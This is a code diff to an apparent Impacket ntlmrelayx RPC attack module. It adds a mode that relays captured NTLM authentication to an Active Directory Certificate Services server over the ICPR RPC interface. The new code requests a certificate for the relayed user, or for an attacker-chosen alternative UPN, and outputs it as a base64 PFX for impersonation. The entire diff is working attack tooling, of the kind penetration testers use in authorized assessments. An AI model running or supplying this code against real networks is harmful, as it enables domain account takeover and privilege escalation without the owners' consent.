@@ -8,19 +8,28 @@
 #
 # Authors:
 #   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
+#   Sylvain Heiniger @(sploutchy) / Compass Security (https://www.compass-security.com)
 #   Based on @agsolino and @_dirkjan code
 #
-
+import base64
 import time
 import string
 import random
 
+from OpenSSL import crypto
+
 from impacket import LOG
-from impacket.dcerpc.v5 import tsch
+from impacket.dcerpc.v5 import tsch, icpr
 from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.icpr import DCERPCSessionError
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack
 
 PROTOCOL_ATTACK_CLASS = "RPCAttack"
+
+# cache already attacked clients
+ELEVATED = []
+
 
 class TSCHRPCAttack:
     def _xml_escape(self, data):
@@ -107,6 +116,47 @@ class TSCHRPCAttack:
         LOG.info('Completed!')
 
 
+class ICPRRPCAttack:
+    def _run(self):
+        key = crypto.PKey()
+        key.generate_key(crypto.TYPE_RSA, 4096)
+
+        if self.username in ELEVATED:
+            LOG.info('Skipping user %s since attack was already performed' % self.username)
+            return
+
+        current_template = self.config.template
+        if current_template is None:
+            current_template = "Machine" if self.username.endswith("$") else "User"
+
+        LOG.debug("Generating a CSR for user %s and template %s" % (self.username, current_template))
+
+        csr = ADCSAttack.generate_csr(key, self.username, self.config.altName, crypto.FILETYPE_ASN1)
+        LOG.info("CSR generated!")
+
+        attributes = ["CertificateTemplate:%s" % current_template]
+
+        if self.config.altName is not None:
+            attributes.append("SAN:upn=%s" % self.config.altName)
+
+        LOG.info("Getting certificate...")
+        try:
+            certificate = icpr.hCertServerRequest(self.dce, csr, attributes, ca=self.config.icpr_ca_name)
+        except DCERPCSessionError as e:
+            if e.error_code == 0x80070057:
+                LOG.error("Error occured while getting certificate: %s Check your CA name?" % e)
+            elif e.error_code == 0x80070005:
+                LOG.error("Error occured while getting certificate: %s Maybe encryption is enforced?" % e)
+            else:
+                LOG.error("Unknown error occured while getting certificate: %s" % e)
+            return
+
+        ELEVATED.append(self.username)
+
+        certificate_store = ADCSAttack.generate_pfx(key, certificate, crypto.FILETYPE_ASN1)
+        LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store)))
+
+
 class RPCAttack(ProtocolAttack, TSCHRPCAttack):
     PLUGIN_NAMES = ["RPC"]
 
@@ -115,15 +165,17 @@ class RPCAttack(ProtocolAttack, TSCHRPCAttack):
         self.dce = dce
         self.rpctransport = dce.get_rpc_transport()
         self.stringbinding = self.rpctransport.get_stringbinding()
+        self.endpoint = config.rpc_mode
 
     def run(self):
-        # Here PUT YOUR CODE!
-
-        # Assume the endpoint is TSCH
-        # TODO: support relaying RPC to different endpoints
-        # TODO: support for providing a shell
-        # TODO: support for getting an output
-        if self.config.command is not None:
-            TSCHRPCAttack._run(self)
+        if self.endpoint == "TSCH":
+            # TODO: support for providing a shell
+            # TODO: support for getting an output
+            if self.config.command is not None:
+                TSCHRPCAttack._run(self)
+            else:
+                LOG.error("No command provided to attack")
+        elif self.endpoint == "ICPR":
+            ICPRRPCAttack._run(self)
         else:
-            LOG.error("No command provided to attack")
+            raise NotImplementedError("Not implemented!")
